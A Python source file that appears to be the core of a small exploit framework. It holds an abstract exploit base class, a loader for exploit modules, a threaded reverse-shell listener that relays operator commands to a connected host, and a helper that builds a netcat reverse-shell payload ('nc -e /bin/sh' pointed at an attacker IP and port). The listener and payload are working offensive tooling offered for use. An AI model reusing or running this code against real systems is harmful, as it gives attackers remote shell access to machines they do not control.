from abc import ABC, abstractmethod
from importlib import import_module
from typing import Dict, List
from os import listdir
import threading
import socket
import sys


# Base class (Abstract class for exploit modules)
class Exploit(ABC):

    # constructor
    def __init__(self, name, description):
        super().__init__()
        self.name = name
        self.description = description

    # Check if target is vulnerable to this exploit.
    @abstractmethod
    def check(self, target, port):
        pass

    # Perform the steps necessary to execute this exploit against the target.
    @abstractmethod
    def exploit(self, target, port, revshell_ip, revshell_port):
        pass

    # Describe the nature of this exploit.
    def describe(self):
        print(self.description)

    # Generic method to create a TCP socket connection to a specified target on a specified port.
    @staticmethod
    def init_tcp_conn(target, port):
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(5)
        try:
            conn.connect((target, port))
            return conn
        except socket.timeout as e:
            print(e)
            return None

    # Get service banner from connection.
    @staticmethod
    def get_banner(conn) -> str:
        banner_data = conn.recv(1024)
        banner = banner_data.decode().strip()
        print('[*] Banner: {}'.format(banner))
        return banner


# Dynamically load exploit classes from modules in msf/exploits.
class ExploitLoader:

    # Get a List of Python files hosted in the given directory.
    @staticmethod
    def list_files(directory) -> List:
        return sorted(f for f in listdir(directory) if f.endswith('.py') and '__init__.py' not in f)

    # Import and initialize all exploit classes and return a List containing them.
    @staticmethod
    def load_exploits(directory='msf/exploits') -> Dict:
        exploits = {}
        package = directory.replace('/', '.')
        filenames = ExploitLoader.list_files(directory)
        for f in filenames:
            # import module
            module_name = f.split('.')[0]
            module_path = '{}.{}'.format(package, module_name)
            module = import_module(module_path) # importing the class

            # initialize class
            class_name = module_name.capitalize() # capitalize class
            my_class = getattr(module, class_name) # IMPORTANT: this one gets the class
            my_instance = my_class() # running the dynamic instance
            exploits[class_name] = my_instance # adding it into the exploits dictionary
        return exploits

# Reverse shell listener.
class Revshell(threading.Thread):

    DEFAULT_REVSHELL_IP = '0.0.0.0'
    DEFAULT_REVSHELL_PORT = 4444

    # constructor
    def __init__(self, listen_host='0.0.0.0', listen_port=4444):

        super().__init__()
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.remote_socket = None
        self.remote_addr = None
        self.server = None

    # Run thread.
    def run(self):

        # start listening
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.listen_host, self.listen_port))
        self.server.listen()
        # wait for inbound connections
        self.remote_socket, self.remote_addr = self.server.accept()
        print('[!] Accepted connection from {}!'.format(self.remote_addr))

    # Destroy the socket listener.
    def terminate(self):

        print('[!] Terminating Revshell thread.')
        self.server.close()

    # Close the connected socket.
    def close(self):

        print('[!] Closing socket connected with {}.'.format(self.remote_addr))
        self.remote_socket.close()
        self.terminate()

    # Interact with connected socket.
    def interact(self):

        print('[!] Ready to interact on socket connected with {}.'.format(self.remote_addr))
        try:
            # get initial input from user
            print('[+] Enter input or press CTRL-D for no input.')
            data = sys.stdin.readline()
            self.remote_socket.sendall(data.encode())
            while True:
                if data.startswith('exit'):
                    print('[*] Closing remote shell.')
                    self.close()
                    break
                # wait for response from target host
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.remote_socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                print(response)
                # get further input from user
                print('[+] Enter further input or press CTRL-D for no input.')
                data = sys.stdin.readline()
                self.remote_socket.sendall(data.encode())
        except Exception as e:
            print(e)
            print('[*] Closing remote shell.')
            self.close()

    # Build the generic netcat command to execute as the payload.
    @staticmethod
    def build_generic_nc_payload(revshell_ip, revshell_port):
        return 'nc -e /bin/sh {} {}'.format(revshell_ip, revshell_port)
